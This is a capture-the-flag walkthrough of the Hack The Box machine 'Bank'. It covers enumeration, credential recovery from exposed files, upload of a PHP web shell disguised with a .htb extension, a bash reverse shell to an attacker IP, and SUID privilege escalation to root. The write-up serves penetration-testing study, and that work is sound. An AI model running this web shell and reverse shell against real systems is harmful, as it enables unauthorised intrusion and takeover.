![logo](/logo.png)

# [Bank- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 16 Jun 2017 as the eight machine on HTB,Bank created by [makelarisjr](https://app.hackthebox.com/users/95) without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/haircut 10.10.10.24
```

###### Output 

![](/Linux/Linux-Easy/Bank/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/bank 10.10.10.29 -Pn                                                                                        ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:03 EAT
Nmap scan report for 10.10.10.29
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.17 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.7`. 

port[22]-ssh
port[53]- dns
port[80]-tcp

when we naviagate to [http://10.10.10.29](http://10.10.10.29)  we find a page of  Apache 

![](/Linux/Linux-Easy/Bank/Screenshots/apache.png)

so looking at the page i think its a misconfigaration of the apache so lets foward this to burpsuite so that we can see the request and also change the hostname to `bank.htb` when looking at the site we find the login form

![](/Linux/Linux-Easy/Bank/Screenshots/login.png)

am going to run now `gobuster` so get some directories

```sh
gobuster dir -u http://bank.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -k 
```

will find the balance-transfer directory after a while.

![](/Linux/Linux-Easy/Bank/Screenshots/gobuster.png)

we find an interesting directories `balance-transfer`  

![](/Linux/Linux-Easy/Bank/Screenshots/balances.png)

looking at the sizes we find that most of the sizes are same so let click one and find out what it is. So upon clicking we find that it has encrypted the account credentials .

![](/Linux/Linux-Easy/Bank/Screenshots/encyrption.png)

so with this information lets try to find an encyrption that may have failed just by looking at the sizes of the files. We find one which seem interesting 

![](/Linux/Linux-Easy/Bank/Screenshots/files.png)

upon oppening we can see that this one failed and we are able to get credentials

![](/Linux/Linux-Easy/Bank/Screenshots/credentials.png)

so we can use the credential to be able to login in and we find a account dashboard

![](/Linux/Linux-Easy/Bank/Screenshots/account.png)

so i can find a support section which seem to be a ticket system and has file upload so i start by uploading and image just to see what happens.

![](/Linux/Linux-Easy/Bank/Screenshots/support.png)

after viewing a the page a find relevant information that a file with an extention of `.htb` will be executed as php

![](/Linux/Linux-Easy/Bank/Screenshots/sources.png)

so i locate a php reverse shell so that i can update it and upload it to get a shell.But first if we can be able to get a `cmd ` then we can run

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.htb
```

![](/Linux/Linux-Easy/Bank/Screenshots/id.png)

so what i do is to create a reverse shell as `rev.htb` and i go to the support and upload it so that by using the shell i can be able to execute bash so that it can execute `rev.sh`

```sh
bash -i >& /dev/tcp/10.10.14.15/1337 0>&1
```

![](/Linux/Linux-Easy/Bank/Screenshots/bash.png)

and just like that i get the shell

![](/Linux/Linux-Easy/Bank/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

![](/Linux/Linux-Easy/Bank/Screenshots/stty.png)

you can get the `user flag` from 

![](/Linux/Linux-Easy/Bank/Screenshots/userflag.png)

Let us run an enumeration script known as [LinEnum](https://github.com/rebootuser/LinEnum).

![](/Linux/Linux-Easy/Bank/Screenshots/LinEnum.png)

it revels that an interesting `SUID`  `/var/htb/bin/emergency`

![](/Linux/Linux-Easy/Bank/Screenshots/emergency.png)

running it it gives us root

![](Linux/Linux-Easy/Bank/Screenshots/root.png)

you can get the `root flag`

![](/Linux/Linux-Easy/Bank/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------

